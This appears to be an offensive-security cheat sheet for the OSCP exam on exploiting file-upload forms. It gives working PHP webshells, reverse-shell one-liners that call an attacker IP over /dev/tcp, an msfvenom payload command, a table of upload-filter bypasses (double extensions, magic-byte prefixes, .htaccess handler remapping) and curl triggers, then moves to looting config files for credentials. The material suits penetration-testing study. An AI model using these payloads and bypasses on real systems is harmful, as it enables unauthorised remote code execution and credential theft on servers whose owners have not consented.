# 💥 File Upload → Webshell

> Any feature that accepts a file (avatar, document, image, import, profile pic) is a candidate for **uploading a webshell** and getting RCE. The whole game is **bypassing the upload filter** and then **reaching the uploaded file via a URL** so the server executes it.

Related: [[Web Exploitation]] · [[HTTP]] · [[Shells]] · [[RCE]] · [[Command Injection]]

---

## 🧠 UPLOAD FORM → THINK
- **Two questions:** (1) can I upload a server-executable file? (2) can I browse to it and make it run?
- Match the **shell language to the stack** — PHP app → `.php`; ASP.NET → `.aspx`; JSP → `.jsp`.
- Filter on **extension, MIME type, or magic bytes** — bypass whichever it checks.
- **Find where it lands** (`/uploads/`, `/images/`, response URL) — a shell you can't reach is useless.
- No code exec? An upload can still enable **LFI→RCE**, **XXE**, **SVG/XSS**, or overwrite config.

## ⚡ QUICK TRIAGE
1. Upload a **normal valid file** first — note the **stored path/filename** and any renaming.
2. Upload a **plain webshell** in the app's language — if it runs, you're done.
3. If blocked, identify **what** is checked (extension? MIME? content?) and apply the matching bypass below.

## 📖 WHAT / WHY
- **What:** the app saves attacker-controlled files; if one is script-executable and web-served, you get RCE.
- **Why it works:** blacklists miss alternate extensions; client-side checks are trivially bypassed; MIME/`Content-Type` is attacker-controlled; extension often trumps real content on the server.
- **Filter types:** client-side JS (bypass in Burp), extension blacklist/whitelist, `Content-Type`/MIME, magic-byte/content inspection, image re-processing.

## 🐚 THE PAYLOADS (match the stack)
Minimal PHP webshell (`shell.php`):
```php
<?php system($_GET['c']); ?>
```
PHP one-liner reverse-shell trigger (call it after upload):
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'"); ?>
```
ASP.NET (`shell.aspx`) — use the classic cmd-exec aspx (e.g. from `/usr/share/webshells/aspx/`):
```bash
ls /usr/share/webshells/            # php, asp, aspx, jsp shells ship with Kali
```
Generate a msfvenom payload file if you want a staged shell:
```bash
msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -o shell.php
```

## 🧗 FILTER BYPASS TABLE
| Filter checks | Bypass |
|---|---|
| Client-side JS only | Intercept in Burp, upload the real shell (JS never runs server-side) |
| Extension blacklist | Alt extensions: `.php3 .php4 .php5 .phtml .pht .phar` (PHP); `.asp .aspx .ashx .asmx`; `.jsp .jspx` |
| Extension whitelist (`.jpg`) | Double extension `shell.php.jpg` / `shell.jpg.php`; trailing dot/space `shell.php.`/`shell.php ` (Windows); null byte `shell.php%00.jpg` (old PHP) |
| `Content-Type`/MIME | Set `Content-Type: image/png` in Burp while body is PHP |
| Magic bytes/content | Prepend image magic bytes: file starts with `GIF89a;` then `<?php ... ?>` |
| Apache config writable dir | Upload `.htaccess` making a benign ext run as PHP: `AddType application/x-httpd-php .xyz` then upload `shell.xyz` |
| IIS | `web.config` upload can yield exec; `.aspx`/`.ashx` |
| Image re-encoded | Embed PHP in EXIF then LFI-include it; or find a non-reprocessed path |

## 💥 EXPLOITATION → INITIAL ACCESS
1. Upload the shell using the bypass that matches the filter.
2. Find its URL (from the response, or brute the upload dir with `ffuf`).
3. Trigger it:
```bash
curl "http://$IP/uploads/shell.php?c=id"
```
4. Turn it into a reverse shell:
```bash
nc -lvnp 443
```
```bash
curl "http://$IP/uploads/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/443+0>%261'"
```
**Result:** shell as `www-data`/`iis apppool` → upgrade ([[Shells]]) → [[Linux Privilege Escalation]]/[[Windows Privilege Escalation]].

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| `.php` uploads & runs | No real filter | webshell → reverse shell | RCE |
| Only images allowed | Whitelist | double-ext / magic-byte / `.htaccess` bypass | RCE |
| Upload works, can't find file | Unknown path | `ffuf` the uploads dir; check response/headers | reach shell |
| `.htaccess` accepted | Config write | map custom ext → PHP | RCE |
| File stored but not executable | Wrong dir/handler | try LFI to include it → [[LFI]] | RCE |
| Renamed to random name | Path unknown | leak name via response/DB/error; or LFI | reach shell |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Every extension blocked | Try `.htaccess`/`web.config`; try LFI-include of an image containing PHP ([[LFI]]) |
| MIME + content both checked | Magic-byte prefix + allowed extension + real code after |
| Can't locate uploaded file | `ffuf` common upload dirs; check the app's DB/profile page that renders it |
| Server strips PHP tags | Try short tags `<?=`, or a different language, or `.phtml`/`.phar` |
| Upload but 403 on execute | Directory has no PHP handler — get it into a web-served executable path |
| Nothing works | Pivot: maybe the bug is XXE/SSRF via the parser, or move to another input |

## 🧹 POST-EXPLOITATION
Upgrade to a TTY ([[Shells]]); `id`/`whoami`; loot webroot configs (`wp-config.php`, `.env`, connection strings) → [[Credential Attacks]]; then privesc.

## ⚠️ COMMON MISTAKES
- Uploading a shell but **never finding its URL** (enumerate the upload dir).
- Wrong language for the stack (PHP shell on an ASP.NET box).
- Forgetting **`.htaccess`/`web.config`** as an upload target.
- Not trying **double extensions / magic bytes** against whitelists.
- Testing only in the browser — **use Burp** to defeat client-side checks and set MIME.

## 🧭 OSCP EXAM MINDSET
Upload = two locks: get the file *in*, and get it to *run*. Always upload a legit file first to learn the storage path and naming, then attack the specific filter. If direct execution is blocked, remember an "image" with PHP inside becomes RCE the moment an [[LFI]] includes it. Once it runs, get a proper reverse shell immediately.

## ✅ DON'T MISS
- [ ] Upload a valid file first → learn stored path + renaming
- [ ] Match shell language to the stack
- [ ] Identify filter type (ext / MIME / content) and bypass it
- [ ] Try `.htaccess`/`web.config`
- [ ] Locate the file (response URL or `ffuf`)
- [ ] Trigger → reverse shell → loot configs

## 📇 CHEAT SHEET
```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
```

```bash
curl "http://$IP/uploads/shell.php?c=id"
```

```bash
printf 'GIF89a;\n<?php system($_GET["c"]); ?>\n' > shell.php.gif   # magic-byte bypass
```

```
.htaccess:  AddType application/x-httpd-php .evil     # then upload shell.evil
```
Bypass order: client-JS → extension list → double-ext → MIME → magic bytes → `.htaccess` → LFI-include.
**Kill shots:** webshell upload → `?c=` RCE → reverse shell.
